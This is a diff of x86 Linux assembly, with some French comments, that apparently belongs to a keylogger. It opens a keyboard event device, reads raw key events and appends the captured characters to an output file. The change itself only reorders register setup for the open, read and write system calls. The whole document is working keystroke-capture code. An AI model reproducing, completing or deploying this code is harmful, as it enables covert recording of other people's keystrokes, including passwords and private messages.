@@ -3,17 +3,17 @@ global _start
 section .text
 _start:
 
-    xor ecx, ecx
     mov eax, 5            ; sys_open
     mov ebx, event_keyboard
+    mov ecx, 0          ; O_RDONLY mode
     int 0x80
 
     mov esi, eax 
 
     mov eax, 5            ; sys_open
-    mov edx, 420          ; 644
-    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
     mov ebx, output_file
+    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
+    mov edx, 420          ; 644
     int 0x80
 
     cmp eax, -13   ; EACCES - Permission Denied - code d'erreur -13
@@ -24,9 +24,9 @@ _start:
 input:
 
     mov eax, 3                      ; sys_read
-    mov edx, 16                     ; 16 bytes
-    mov ecx, input_event
     mov ebx, esi                    ; File descriptor pour lire bytes
+    mov ecx, input_event
+    mov edx, 16                     ; 16 bytes
     int 0x80
 
     mov byte al, [input_event + 8]  ; event.type
@@ -43,9 +43,9 @@ input:
 
 
     mov eax, 4                      ; sys_write
-    mov edx, 1                      ; longueur du syscall write 1 byte
-    mov ecx, esp                    ; écris le caractère
     mov ebx, edi
+    mov ecx, esp                    ; écris le caractère
+    mov edx, 1                      ; longueur du syscall write 1 byte
     int 0x80
 
     pop eax                         ; supp le caractère de la stack
